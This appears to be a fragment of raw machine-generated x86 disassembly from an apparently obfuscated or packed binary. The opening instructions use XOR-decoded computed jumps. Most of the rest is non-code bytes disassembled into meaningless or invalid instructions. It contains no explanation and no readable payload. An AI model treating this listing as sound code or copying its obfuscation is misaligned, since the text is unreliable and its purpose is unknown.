  408a24:	mov    ecx,DWORD PTR [ebp-0x8]
  408a27:	xor    DWORD PTR ds:0x428e9d,0xa39
  408a31:	xor    eax,esi
  408a33:	sbb    DWORD PTR ds:0x428e39,0x428e35
  408a3d:	add    eax,edi
  408a3f:	mov    DWORD PTR ds:0x428e3d,0x1847
  408a49:	cmp    ecx,eax
  408a4b:	mov    DWORD PTR ds:0x428e41,0x373f
  408a55:	je     0x408a7d
  408a5b:	movzx  ecx,WORD PTR ds:0x428e49
  408a62:	mov    eax,DWORD PTR [ebp-0x34]
  408a65:	movzx  eax,WORD PTR [eax+ebx*2]
  408a69:	mov    ecx,DWORD PTR ds:0x428e4d
  408a6f:	mov    ecx,DWORD PTR [ebp-0x14]
  408a72:	mov    eax,DWORD PTR [ecx+eax*4]
  408a75:	mov    DWORD PTR [ebp-0x38],eax
  408a78:	jmp    0x408990
  408a7d:	mov    eax,DWORD PTR [ebp-0xc]
  408a80:	xor    eax,esi
  408a82:	lea    ebx,[ebx+eax*1+0x3272f8]
  408a89:	jmp    0x4086d2
  408a8e:	mov    eax,DWORD PTR [ebp-0x4]
  408a91:	xor    eax,esi
  408a93:	add    eax,edi
  408a95:	jmp    0x40f699
  408a9a:	mov    eax,DWORD PTR [ebp-0x38]
  408a9d:	add    eax,DWORD PTR [ebp+0x8]
  408aa0:	mov    DWORD PTR [ebp-0x18],eax
  408aa3:	mov    eax,DWORD PTR [ebp-0x1c]
  408aa6:	test   eax,eax
  408aa8:	je     0x40d282
  408aae:	mov    DWORD PTR [ebp-0x20],0x0
  408ab5:	push   0x4
  408ab7:	xor    edx,edx
  408ab9:	pop    edx
  408aba:	add    edx,0x9
  408abd:	push   edx
  408abe:	pop    ecx
  408abf:	push   0x8
  408ac1:	dec    ecx
  408ac2:	pop    ebx
  408ac3:	dec    ebx
  408ac4:	xchg   ebx,ecx
  408ac6:	sub    ebx,ecx
  408ac8:	xchg   ebx,ecx
  408aca:	dec    ecx
  408acb:	mov    eax,DWORD PTR [ebp-0x1c]
  408ace:	imul   eax,ecx
  408ad1:	sub    esp,eax
  408ad3:	mov    DWORD PTR [ebp-0x20],esp
  408ad6:	mov    eax,DWORD PTR [ebp-0x4]
  408ad9:	xor    eax,esi
  408adb:	add    eax,edi
  408add:	jmp    0x40aebb
  408ae2:	mov    ecx,DWORD PTR [ebp-0xc]
  408ae5:	mov    eax,DWORD PTR [ebp+0x8]
  408ae8:	mov    edx,DWORD PTR [ebp+0x14]
  408aeb:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  408aef:	xor    ecx,esi
  408af1:	add    ecx,edi
  408af3:	xor    edx,edx
  408af5:	div    ecx
  408af7:	mov    ecx,DWORD PTR [ebp-0x4]
  408afa:	xor    ecx,esi
  408afc:	lea    eax,[ecx+eax*1+0x3272f8]
  408b03:	mov    ecx,DWORD PTR [ebp+0x8]
  408b06:	mov    edx,DWORD PTR [ebp-0x20]
  408b09:	jmp    0x40aea9
  408b0e:	fbstp  TBYTE PTR [ebp*1-0xe9985a5]
  408b15:	cmp    cl,dh
  408b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b18:	fnstsw WORD PTR [ecx-0x18]
  408b1b:	mov    bl,0x89
  408b1d:	sbb    eax,0x7b7be429
  408b22:	(bad)  
  408b23:	sahf   
  408b24:	jnp    0x408ba1
  408b26:	in     eax,0xb6
  408b28:	mov    edi,0xc082b825
  408b2d:	sti    
  408b2e:	gs shr al,0x22
  408b32:	sahf   
  408b33:	stos   DWORD PTR es:[edi],eax
  408b34:	ret    0x31fb
  408b37:	adc    al,0xd6
  408b39:	sbb    DWORD PTR [esi+0x47e10d11],esp
  408b3f:	daa    
  408b40:	xor    eax,esp
  408b42:	test   BYTE PTR [ebx],dh
  408b44:	(bad)  
  408b45:	mov    BYTE PTR ds:[edx],dh
  408b48:	fcom   DWORD PTR [eax]
  408b4a:	jbe    0x408b38
  408b4c:	xor    ebx,esi
  408b4e:	neg    ebp
  408b50:	adc    bh,BYTE PTR [edi]
  408b52:	and    BYTE PTR [eax+ebp*4],cl
  408b55:	fcom   DWORD PTR [eax]
  408b57:	mov    bh,0x7e
  408b59:	cdq    
  408b5a:	div    ah
  408b5c:	push   ebx
  408b5d:	outs   dx,DWORD PTR ds:[esi]
  408b5e:	mov    ch,0x9f
  408b60:	in     eax,0x74
  408b62:	loopne 0x408af9
  408b64:	add    BYTE PTR [edi+0x46],0xac
  408b68:	jg     0x408b93
  408b6a:	and    BYTE PTR [ecx],0x0
  408b6d:	mov    ah,0xaf
  408b6f:	pop    ebx
  408b70:	mov    dh,0x75
  408b72:	pop    ecx
  408b73:	cmp    al,0xec
  408b75:	xchg   esp,eax
  408b76:	lea    esi,[esi]
  408b78:	shl    BYTE PTR [edi-0x5efed275],cl
  408b7e:	sbb    al,0x65
  408b80:	ins    BYTE PTR es:[edi],dx
  408b81:	je     0x408b51
  408b83:	mov    esi,0x2dd4852a
  408b88:	xchg   ecx,eax
  408b89:	mov    ebp,0xbee5e5da
  408b8e:	lock out dx,al
  408b90:	ror    BYTE PTR [esi-0x2cda1962],cl
  408b96:	and    BYTE PTR [edi-0x2b],bh
  408b99:	inc    ecx
  408b9a:	hlt    
  408b9b:	mov    ebp,0xc9f2da41
  408ba0:	xchg   edi,eax
  408ba1:	inc    ecx
  408ba2:	icebp  
  408ba3:	fimul  DWORD PTR [ebx+0x21c84dae]
  408ba9:	xchg   edx,eax
  408baa:	out    dx,al
  408bab:	add    bh,BYTE PTR [edx-0x57]
  408bae:	shl    BYTE PTR [ebx+0x213323e8],0xf8
  408bb5:	sub    dl,BYTE PTR [edi-0x21359f69]
  408bbb:	sbb    eax,0xae5c535c
  408bc0:	les    esp,FWORD PTR [eax]
  408bc2:	sbb    eax,0xc19e9860
  408bc7:	cmp    al,0x5e
  408bc9:	mov    BYTE PTR [edi-0x6d],bl
  408bcc:	sbb    BYTE PTR [eax],al
  408bce:	add    edx,ebx
  408bd0:	stos   BYTE PTR es:[edi],al
  408bd1:	and    BYTE PTR [esp+ecx*4-0x880fa78],bh
  408bd8:	add    DWORD PTR [ecx+0x6e],0x6a5a306c
  408bdf:	addr16 xor dh,ah
  408be2:	(bad)  
  408be3:	or     esp,DWORD PTR [edx]
  408be5:	pop    eax
  408be6:	ret    
  408be7:	mov    eax,ds:0x657a988
  408bec:	mov    esp,0x5f1fce2b
  408bf1:	mov    ebp,?
  408bf3:	sbb    BYTE PTR [edi+0x30aa5832],ch
  408bf9:	jmp    0x408bc8
  408bfb:	and    dl,ch
  408bfd:	iret   
  408bfe:	push   ss
  408bff:	aaa    
  408c00:	push   0x5678e37f
  408c05:	and    bh,BYTE PTR [ebx-0x1c]
  408c08:	jmp    0x408bb3
  408c0a:	xor    eax,0xa30a488f
  408c0f:	xchg   ebp,eax
  408c10:	add    BYTE PTR [edx-0x376d59f8],cl
  408c16:	pop    edi
  408c17:	or     al,0x61
  408c1a:	cmp    BYTE PTR [edx+ebp*8-0x21],bh
  408c1e:	inc    ebx
  408c1f:	jb     0x408bee
  408c21:	mov    esp,0x584a0c72
  408c26:	sub    ah,BYTE PTR [edi+0x7e1ac44d]
  408c2c:	mov    ah,0x92
  408c2e:	ror    BYTE PTR [edi-0x3e86c614],1
  408c34:	mov    bl,0xab
  408c36:	in     eax,0xef
  408c38:	push   ebx
  408c39:	rol    DWORD PTR [ecx+eax*8-0x75237fcb],1
  408c40:	and    dl,BYTE PTR [ecx]
  408c42:	jne    0x408c7d
  408c44:	loope  0x408bee
  408c46:	inc    ebx
  408c47:	sub    bh,BYTE PTR [esi+0x6a]
  408c4a:	sahf   
  408c4b:	xchg   esi,eax
  408c4c:	push   ecx
  408c4e:	ja     0x408c99
  408c50:	outs   dx,DWORD PTR ds:[esi]
  408c51:	push   esp
  408c52:	hlt    
  408c53:	cmp    eax,0x47eb0359
  408c58:	ret    
  408c59:	ss jnp 0x408caa
  408c5c:	outs   dx,DWORD PTR ds:[esi]
  408c5d:	test   eax,0x6ae75434
  408c62:	aas    
  408c63:	push   ecx
  408c64:	pop    es
  408c65:	inc    ebx
  408c66:	add    ah,bh
  408c68:	mov    ds:0xcfbd8362,al
  408c6d:	jnp    0x408c5f
  408c6f:	push   0x46458682
  408c74:	mov    esi,0x2b9a6c7
  408c79:	bound  ebx,QWORD PTR [edx-0x3c84d3d]
  408c7f:	xchg   edi,eax
  408c80:	pop    ebp
  408c81:	and    esi,DWORD PTR [ebp+0x53]
  408c84:	outs   dx,DWORD PTR ds:[esi]
  408c85:	loopne 0x408c69
  408c87:	int    0xb2
  408c89:	jns    0x408cde
  408c8b:	inc    ecx
  408c8c:	call   0xed6dbb5
  408c91:	cmp    al,0xb2
  408c93:	rol    BYTE PTR [eax],1
  408c95:	mov    ebp,0xb9568b05
  408c9a:	inc    ebp
  408c9b:	dec    edi
  408c9c:	jmp    0xf2fe:0xe7796379
  408ca3:	retf   0x913
  408ca6:	jge    0x408c8b
  408ca8:	mov    al,0xe2
  408caa:	push   esp
  408cab:	mov    WORD PTR [ebp+0x5f],ds
  408cae:	lds    esi,FWORD PTR [eax]
  408cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cb1:	or     al,BYTE PTR [eax-0x7f]
  408cb4:	or     ch,0x10
  408cb7:	call   0x9a4b59e5
  408cbc:	out    0xd4,al
  408cbe:	test   eax,0x276cb3f7
  408cc3:	cwde   
  408cc4:	mov    dl,0xe5
  408cc6:	les    esi,FWORD PTR [edx-0x73]
  408cc9:	and    BYTE PTR [edx+edi*2-0x22c70564],0xbe
  408cd1:	jecxz  0x408c54
  408cd3:	add    DWORD PTR [eax],ebx
  408cd5:	and    al,0x53
  408cd7:	jb     0x408d03
  408cd9:	jno    0x408cb3
  408cdb:	push   es
  408cdc:	cmp    DWORD PTR [edx-0x7e],0x65
  408ce0:	dec    esp
  408ce1:	dec    eax
  408ce2:	cmp    DWORD PTR [edi+ebp*8+0x4d],0x45
  408ce7:	pop    edx
  408ce8:	sar    cl,1
  408cea:	lock sub edx,DWORD PTR [ebp+0x54cc2a5d]
  408cf1:	int    0x21
  408cf3:	and    eax,0x77241a7c
  408cf8:	mov    ebx,0xce822042
  408cfd:	rol    DWORD PTR [ebp-0x3a8cf3f2],0xac
  408d04:	xor    bl,bl
  408d06:	(bad)  
  408d07:	push   edx
  408d08:	mov    ebp,0x2c032a04
  408d0d:	add    al,0xd6
  408d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d10:	jp     0x408cc5
  408d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d13:	pop    ecx
  408d14:	mov    ah,0xa2
  408d16:	lock mov ah,0x83
  408d19:	xchg   esp,edx
  408d1b:	retf   
  408d1c:	jge    0x408d0f
  408d1e:	sar    DWORD PTR [ebx-0x7898f34f],1
  408d24:	adc    al,cl
  408d26:	pushf  
  408d27:	fwait
  408d28:	jbe    0x408cd0
  408d2a:	fnstenv [ebp-0x48]
  408d2d:	mov    ebp,0x29d00765
  408d32:	shl    BYTE PTR [esi+0x7c7e4947],cl
  408d38:	dec    ecx
  408d39:	mov    ecx,0x10a44436
  408d3e:	push   ecx
  408d3f:	xor    edx,DWORD PTR [ebp-0x63f0834f]
  408d45:	pusha  
  408d46:	mov    dl,0x94
  408d48:	sar    DWORD PTR [ebx],1
  408d4a:	data16 stc 
  408d4c:	mov    ds:0x78c01f4e,eax
  408d51:	mov    bl,0x49
  408d53:	xor    ah,BYTE PTR [ebp+eiz*2+0x77]
  408d57:	div    DWORD PTR [esi-0x8f02de0]
  408d5d:	xchg   esi,eax
  408d5e:	loope  0x408d4b
  408d60:	dec    ebx
  408d61:	ss add eax,0xbfcb4559
  408d67:	sub    dl,BYTE PTR [esi*8-0x133203e0]
  408d6e:	xor    esp,DWORD PTR [eax+0x6e]
  408d71:	cmp    ebx,ebp
  408d73:	or     DWORD PTR [ebp+0x653cf1c5],edx
  408d79:	(bad)  
  408d7a:	in     al,dx
  408d7b:	loopne 0x408da4
  408d7d:	mov    esp,ebp
  408d7f:	add    ebx,edx
  408d81:	pop    ss
  408d82:	add    BYTE PTR [ebx-0x2e6c3a7a],bh
  408d88:	cmp    eax,0x9ec33478
  408d8d:	enter  0x8caf,0x56
  408d91:	adc    BYTE PTR [ecx-0x23],dh
  408d94:	or     al,0xd0
  408d96:	mov    dl,0x55
  408d98:	mov    eax,ds:0x197c9d0b
  408d9d:	add    edx,DWORD PTR [eax]
  408d9f:	retf   
  408da0:	call   FWORD PTR [eax+0x1a]
  408da3:	mov    esp,0xdbd9fa60
  408da8:	aam    0xc8
  408daa:	pop    ds
  408dab:	sbb    eax,0xc4bb050e
  408db0:	xor    BYTE PTR [eax],dh
  408db2:	push   ebx
  408db3:	idiv   BYTE PTR [ebx-0x1b]
  408db6:	in     al,0xf5
  408db8:	sbb    DWORD PTR [edi-0x50c8273b],eax
  408dbe:	rcl    BYTE PTR [ecx+0x8],1
  408dc1:	fprem1 
  408dc3:	jb     0x408dc6
  408dc5:	sub    bh,BYTE PTR es:[ebx+0x2b]
  408dc9:	mov    eax,0x8e51e354
  408dce:	mov    DWORD PTR [ebx-0x5928d972],ecx
  408dd4:	mov    DWORD PTR [edx],esp
  408dd6:	scas   al,BYTE PTR es:[edi]
  408dd7:	mov    bl,0x60
  408dd9:	add    eax,0xd4ee6e11
  408dde:	repz mov ebp,0xccf108a8
  408de4:	jmp    0x53bf5a67
  408de9:	out    0x9f,al
  408deb:	jmp    0x9e94d7a3
  408df0:	sahf   
  408df1:	mov    dh,0xcd
  408df3:	bound  esi,QWORD PTR [esi]
  408df5:	cmp    al,0xcc
  408df7:	rcl    DWORD PTR [edx+0xe03636f],0x4a
  408dfe:	dec    ecx
  408dff:	cmp    al,0x51
  408e01:	dec    ecx
  408e02:	test   eax,0x11c696ae
  408e07:	mov    dl,0x8d
  408e09:	add    DWORD PTR [esi-0x6384e1c1],eax
  408e0f:	add    BYTE PTR [ecx],cl
  408e11:	out    dx,al
  408e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e13:	xor    eax,0x7ace9856
  408e18:	xor    al,bh
  408e1a:	hlt    
  408e1b:	cld    
  408e1c:	pop    eax
  408e1d:	push   ebp
  408e1e:	call   0xe8f7f3c0
  408e23:	sbb    dl,BYTE PTR [edx+0x57]
  408e26:	xchg   ebp,eax
  408e27:	cmp    bh,BYTE PTR [ecx+0x4c496220]
  408e2d:	out    dx,eax
  408e2e:	pop    esi
  408e2f:	and    BYTE PTR [edi],cl
  408e31:	stos   BYTE PTR es:[edi],al
  408e32:	jecxz  0x408dd5
  408e34:	inc    edi
  408e35:	call   0xb350a353
  408e3a:	test   eax,0x8ff5e7c0
  408e3f:	pusha  
  408e40:	cmp    eax,esp
  408e42:	aas    
  408e43:	sub    BYTE PTR [edx+esi*8-0x1d],al
  408e47:	enter  0x7650,0xcb
  408e4b:	pop    esi
  408e4c:	loope  0x408e4e
  408e4e:	or     BYTE PTR [esi+0x3833783e],ch
  408e54:	jmp    0x74c6bd3e
  408e59:	cwde   
  408e5a:	gs mov esi,ecx
  408e5d:	mov    ds:0xf6e9b283,al
  408e62:	cdq    
  408e63:	(bad)  
  408e65:	mov    ds:0xc06f9453,eax
  408e6a:	jl     0x408ed9
  408e6c:	icebp  
  408e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e6e:	jns    0x408e66
  408e70:	(bad)  
  408e71:	imul   esp,DWORD PTR [ebx-0x46698953],0xffffffc9
  408e78:	cmp    BYTE PTR [edi],bl
  408e7a:	dec    edi
  408e7b:	sbb    DWORD PTR [esp+ecx*8],0x19e5869b
  408e82:	popa   
  408e83:	pushf  
  408e84:	cmp    eax,0x9c789fea
  408e89:	rcl    BYTE PTR [ebp+0x33],1
  408e8c:	mov    eax,0xfa0c513b
  408e91:	inc    esp
  408e92:	mov    edx,0xcfb325e4
  408e97:	(bad)  
  408e98:	cwde   
  408e99:	sub    ecx,DWORD PTR [ebp-0x66088cef]
  408e9f:	repz mov eax,ds:0xfaf0a2ce
  408ea5:	pop    ebx
  408ea6:	sub    esp,esp
  408ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ea9:	sahf   
  408eaa:	loopne 0x408f17
  408eac:	(bad)  
  408ead:	scas   al,BYTE PTR es:[edi]
  408eae:	add    ebx,DWORD PTR [ecx]
  408eb0:	shl    DWORD PTR [edx-0x2e4579ab],1
  408eb6:	idiv   BYTE PTR [esi]
  408eb8:	adc    bh,BYTE PTR [ebx-0x47c79b78]
  408ebe:	inc    ebp
  408ebf:	test   dl,dh
  408ec1:	add    DWORD PTR fs:[edx+0x63dd8bd1],eax
  408ec8:	push   es
  408ec9:	sahf   
  408eca:	jnp    0x408f16
  408ecc:	fbld   TBYTE PTR [edx-0x77]
  408ecf:	xor    eax,ebp
  408ed1:	popa   
  408ed2:	lds    edx,FWORD PTR [ebx-0x69]
  408ed5:	cmp    DWORD PTR [edi-0x15],ebx
  408ed8:	adc    ebx,edx
  408eda:	sub    al,0x7a
  408edc:	push   es
  408edd:	jae    0x408e66
  408edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee0:	push   edx
  408ee1:	retf   
  408ee2:	sbb    esi,DWORD PTR [edi+0x344f361e]
  408ee8:	lea    edx,[edx]
  408eea:	push   0xbbc30156
  408eef:	shl    BYTE PTR [ebx-0x12845dcb],cl
  408ef5:	inc    edi
  408ef6:	fist   DWORD PTR [edx-0x775c890c]
  408efc:	test   BYTE PTR [edi+0x6f8ea3ae],0x3d
  408f03:	and    edx,esp
  408f05:	ins    BYTE PTR es:[edi],dx
  408f06:	and    DWORD PTR gs:[edx],edx
  408f09:	fdiv   DWORD PTR [ebx]
  408f0b:	ins    BYTE PTR es:[edi],dx
  408f0c:	cdq    
  408f0d:	mov    eax,ds:0x83690133
  408f12:	mov    eax,0x7ce3120
  408f17:	lea    ebp,[ebx-0x59c342b1]
  408f1d:	inc    eax
  408f1e:	pushf  
  408f1f:	xchg   DWORD PTR [eiz*1-0x289d22c6],esp
  408f26:	cmp    eax,DWORD PTR ds:0x4a135d02
  408f2c:	mov    bl,0xc
  408f2e:	xor    al,0xff
  408f30:	daa    
  408f31:	scas   al,BYTE PTR es:[edi]
  408f32:	dec    esi
  408f33:	jno    0x408ee7
  408f35:	cli    
  408f36:	repnz aas 
  408f38:	ja     0x408f11
  408f3a:	mov    eax,0x691201cd
  408f3f:	popf   
  408f40:	or     ecx,ecx
  408f42:	pushf  
  408f43:	adc    eax,0x66c7882
  408f48:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  408f4a:	pop    ds
  408f4b:	mov    esi,0x10c13a23
  408f50:	sbb    eax,edi
  408f52:	in     eax,0x9c
  408f54:	cwde   
  408f55:	or     BYTE PTR [edx],dl
  408f57:	(bad)  
  408f58:	in     al,dx
  408f59:	cmp    ch,dh
  408f5b:	test   al,0xc8
  408f5d:	mov    edx,0x22c6d09d
  408f62:	push   ss
  408f63:	dec    ebx
  408f64:	stos   BYTE PTR es:[edi],al
  408f65:	das    
  408f66:	mov    ebp,0x1321409c
  408f6b:	add    bh,0x52
  408f6e:	cmp    DWORD PTR [esi],0xbb54e32f
  408f74:	data16 jo 0x408fcc
  408f77:	cmp    esi,DWORD PTR [ecx-0x63c368f2]
  408f7d:	mov    edx,0xd8eed460
  408f82:	scas   eax,DWORD PTR es:[edi]
  408f83:	es add eax,0xa0c7ae41
  408f89:	or     DWORD PTR [esi-0x28],edi
  408f8c:	sti    
  408f8d:	popa   
  408f8e:	pop    esp
  408f8f:	inc    esi
  408f90:	xor    edx,ecx
  408f92:	jge    0x408f6e
  408f94:	test   BYTE PTR [edx+0x1bad3fb5],dl
  408f9a:	pushf  
  408f9b:	fld    DWORD PTR [ebx]
  408f9d:	cmp    eax,0xc2fd813a
  408fa2:	ficomp WORD PTR [ecx-0x649f2e14]
  408fa8:	inc    ebx
  408fa9:	mov    ds:0xb0dd2b35,eax
  408fae:	ds retf 0xd41f
  408fb2:	mov    dh,0xda
  408fb4:	in     eax,dx
  408fb5:	or     BYTE PTR [eax-0x4f],0x36
  408fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fba:	jecxz  0x408fa4
  408fbc:	and    edx,DWORD PTR [ecx+eax*4+0x17f67e47]
  408fc3:	pop    es
  408fc4:	out    0x5c,eax
  408fc6:	adc    ecx,DWORD PTR [ebx-0x224b7904]
  408fcc:	inc    ebx
  408fcd:	in     eax,0x32
  408fcf:	jns    0x408fb3
  408fd1:	xchg   DWORD PTR [ecx-0x16f7c947],esp
  408fd7:	fimul  DWORD PTR [esi]
  408fd9:	out    0x8a,al
  408fdb:	cwde   
  408fdc:	pop    eax
  408fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fde:	in     al,0x37
  408fe0:	sahf   
  408fe1:	adc    edx,DWORD PTR [ecx]
  408fe3:	nop
  408fe4:	(bad)  
  408fe5:	sub    bl,BYTE PTR [ebx-0x183eae4c]
  408feb:	ins    BYTE PTR es:[edi],dx
  408fec:	jg     0x409036
  408fee:	ret    0x288b
  408ff1:	sbb    BYTE PTR [ebx+0x6a],bl
  408ff4:	lahf   
  408ff5:	aad    0x33
  408ff7:	inc    esi
  408ff8:	dec    ebp
  408ff9:	shr    DWORD PTR [eax],1
  408ffb:	fnsave [esi+0x6f]
  408ffe:	je     0x408f97
  409000:	fstp   QWORD PTR [esi+0x31]
  409003:	cld    
  409004:	fldcw  WORD PTR [eax]
  409006:	or     eax,esi
  409008:	setnp  BYTE PTR [edi+0x2707a192]
  40900f:	sti    
  409010:	loop   0x408fd3
  409012:	bndldx (bad),[esi-0x4df17428]
  409019:	rol    BYTE PTR [ebx+0x32b3f66f],1
  40901f:	ror    DWORD PTR [ecx+0x42],0x70
  409023:	jae    0x40904e
  409025:	mov    dl,BYTE PTR [edx+eiz*2-0x2581a509]
  40902c:	sbb    cl,BYTE PTR ds:0x9d99103d
  409032:	push   esi
  409033:	inc    ebx
  409034:	shl    BYTE PTR [esi],0xa
  409037:	cmp    edi,edx
  409039:	aam    0xf4
  40903b:	xchg   edi,eax
  40903c:	jae    0x40900e
  40903e:	cmp    al,0x5a
  409040:	fst    DWORD PTR [ecx+0x3a3cd182]
  409046:	in     al,dx
  409047:	outs   dx,DWORD PTR ds:[esi]
  409049:	pop    ss
  40904a:	cwde   
  40904b:	stos   BYTE PTR es:[edi],al
  40904c:	mov    esi,ss
  40904e:	and    al,0xc8
  409050:	sbb    eax,0x79d1d5bc
  409055:	xor    BYTE PTR [ebp+0x75155e5],bh
  40905b:	hlt    
  40905c:	push   esi
  40905d:	in     eax,dx
  40905e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40905f:	sub    BYTE PTR ds:0xcf39c854,ah
  409065:	add    eax,DWORD PTR [ecx+0xce378b1]
  40906b:	jecxz  0x4090a0
  40906d:	jnp    0x408ffc
  40906f:	clc    
  409070:	mov    ds:0x65d496ee,eax
  409075:	and    DWORD PTR [edi+edx*4],0xb0eaa14f
  40907c:	sub    eax,0xb430ee58
  409081:	jp     0x409089
  409083:	or     DWORD PTR [esp+edx*8+0x65904e38],ecx
  40908a:	out    dx,al
  40908b:	ja     0x40905d
  40908d:	push   ecx
  40908e:	sti    
  40908f:	(bad)  
  409090:	jge    0x4090db
  409092:	jb     0x4090fd
  409094:	jnp    0x4090ff
  409096:	mov    ecx,0x53353c9b
  40909b:	jb     0x4090bd
  40909d:	std    
  40909e:	cli    
  40909f:	mov    BYTE PTR [eax-0xe],dl
  4090a2:	imul   edi,DWORD PTR [edi+0x5e6be587],0xffffffb6
  4090a9:	mov    bh,0xe0
  4090ab:	push   edx
  4090ac:	iret   
  4090ad:	jbe    0x4090ae
  4090af:	add    ecx,esp
  4090b1:	sub    DWORD PTR [edx+0x18e3887c],edx
  4090b7:	mov    ch,0xc1
  4090b9:	push   es
  4090ba:	lock xor BYTE PTR [edi-0x2c],0xb2
  4090bf:	xchg   BYTE PTR [esi+0x57cbdc7f],dl
  4090c5:	ss pop edi
  4090c7:	lods   eax,DWORD PTR ds:[esi]
  4090c8:	shl    BYTE PTR [ecx+0x44],1
  4090cb:	retf   
  4090cc:	fisttp DWORD PTR [esi+ebx*2-0x74de65ac]
  4090d3:	mov    ebx,0x397d0105
  4090d8:	ss dec edx
  4090da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090db:	imul   ecx,esp,0x4eff5e55
  4090e1:	iret   
  4090e2:	or     bh,cl
  4090e4:	stos   DWORD PTR es:[edi],eax
  4090e5:	dec    edi
  4090e6:	adc    al,0xff
  4090e8:	xchg   esi,eax
  4090e9:	sub    BYTE PTR [edx],0x82
  4090ec:	shl    esp,cl
  4090ee:	sbb    al,0x7a
  4090f1:	push   ebx
  4090f2:	adc    BYTE PTR [ebx+edx*1],0x55
  4090f6:	sar    ebx,1
  4090f8:	add    DWORD PTR [ebx+0x11f1cdc2],eax
  4090fe:	push   ecx
  4090ff:	cli    
  409100:	sub    ebx,DWORD PTR [ecx]
  409102:	fisubr WORD PTR [edx-0x78]
  409105:	cmp    BYTE PTR [ecx-0x465c807e],cl
  40910b:	sub    al,0x4b
  40910d:	add    ecx,DWORD PTR [edi-0x2f]
  409110:	dec    edi
  409111:	not    DWORD PTR [ecx+0x356398ef]
  409117:	xchg   ecx,eax
  409118:	sbb    DWORD PTR [ebp+0x75ee3aa8],0x9778cfb6
  409122:	jo     0x40912d
  409124:	push   sp
  409126:	sbb    eax,0x1110a53c
  40912b:	in     eax,dx
  40912c:	lea    esi,[edi+esi*8-0x4083d8ac]
  409133:	or     BYTE PTR ds:0xaffdcf89,0x4c
  40913a:	sbb    cl,cl
  40913c:	sub    eax,DWORD PTR [ecx-0x654a3920]
  409142:	out    0xab,eax
  409144:	fstp   TBYTE PTR ds:[edi+0x103e5ce2]
  40914b:	mov    BYTE PTR [edi],bh
  40914d:	stos   BYTE PTR es:[edi],al
  40914e:	pop    ss
  40914f:	xor    BYTE PTR [eax+0x10],al
  409152:	dec    eax
  409153:	mov    ebx,0x28ebe5e
  409158:	mov    esi,DWORD PTR [edi+eax*2-0x143e6887]
  40915f:	dec    eax
  409160:	sub    eax,0x2a787f3c
  409165:	and    ebx,edx
  409167:	mov    dh,0xda
  409169:	xor    ecx,DWORD PTR [ecx+0x1d]
  40916c:	adc    bh,ch
  40916e:	sub    dl,bl
  409170:	addr16 push ss
  409172:	mov    esi,ecx
  409174:	jne    0x4090fa
  409176:	scas   al,BYTE PTR es:[edi]
  409177:	pushf  
  409178:	or     eax,0x5892cffe
  40917d:	jne    0x4091d9
  40917f:	jo     0x409102
  409181:	mov    edi,DWORD PTR [esp+edi*4+0x67]
  409185:	inc    ebp
  409186:	mov    ebp,0x976af9c7
  40918b:	mov    edi,edi
  40918d:	push   0xf36f5264
  409192:	sar    edx,0x6c
  409195:	fisub  DWORD PTR [edx+0x1]
  409198:	sbb    eax,0x9643aa45
  40919d:	das    
  40919e:	les    ecx,FWORD PTR [edx+ebp*1-0xb15d3c6]
  4091a5:	ds sbb DWORD PTR ss:[ecx+0x76],0x37ad321e
  4091ae:	mov    ?,WORD PTR [ecx+0x4ce40fd2]
  4091b4:	mov    esi,ebp
  4091b6:	test   DWORD PTR [edi+eiz*8],edx
  4091b9:	push   ebx
  4091ba:	in     al,dx
  4091bb:	push   ecx
  4091bc:	mov    ds:0x6c4a4332,al
  4091c1:	sub    BYTE PTR [ebp-0x7ff9218d],0x74
  4091c8:	scas   eax,DWORD PTR es:[edi]
  4091c9:	mov    edx,0x5a65a3e8
  4091ce:	loopne 0x409218
  4091d0:	dec    ebx
  4091d1:	data16 cmp BYTE PTR [edi-0x11],ah
  4091d5:	enter  0x39ad,0xb2
  4091d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091da:	mov    ah,0xe2
  4091dc:	add    BYTE PTR [ebx+0x45],dl
  4091df:	mov    ebx,0x1c2cd4b7
  4091e4:	push   ecx
  4091e5:	ret    0xe3e
  4091e8:	fldcw  WORD PTR [ebx]
  4091ea:	retf   
  4091eb:	or     al,0x1f
  4091ed:	loop   0x4091e2
  4091ef:	cdq    
  4091f0:	push   ebp
  4091f1:	push   cs
  4091f2:	push   ds
  4091f3:	call   0xe0db:0x199f9b95
  4091fa:	pop    edi
  4091fb:	push   es
  4091fc:	dec    esi
  4091fd:	jbe    0x409195
  4091ff:	ja     0x409219
  409201:	in     eax,0xbc
  409203:	div    DWORD PTR [ecx]
  409205:	cmp    eax,0x348b795f
  40920a:	fst    DWORD PTR [edx]
  40920c:	xor    dh,BYTE PTR [edx+0x14]
  40920f:	xchg   cx,ax
  409211:	std    
  409212:	mov    bh,0x35
  409214:	enter  0x5e1e,0xce
  409218:	mov    edi,0x6c4fb342
  40921d:	jno    0x4091c7
  40921f:	ret    
  409220:	pop    eax
  409221:	bound  ebp,QWORD PTR [ebp+0x1d79a6ad]
  409227:	xor    ecx,DWORD PTR [edi-0x36]
  40922a:	adc    ecx,ebp
  40922c:	call   0xbf78778c
  409231:	jae    0x4091cf
  409233:	sub    al,0x3f
  409235:	and    eax,0xf6236586
  40923a:	and    cl,BYTE PTR [eax-0x7200f880]
  409240:	or     dh,dh
  409242:	std    
  409243:	aas    
  409244:	xor    eax,0x41da5898
  409249:	fld    QWORD PTR [eax+0x1ec96845]
  40924f:	mov    WORD PTR [esi],?
  409251:	lahf   
  409252:	mov    DWORD PTR [edx],edi
  409254:	lea    ebp,[edi+ebp*8+0x37126be6]
  40925b:	jp     0x409285
  40925d:	scas   al,BYTE PTR es:[edi]
  40925e:	cli    
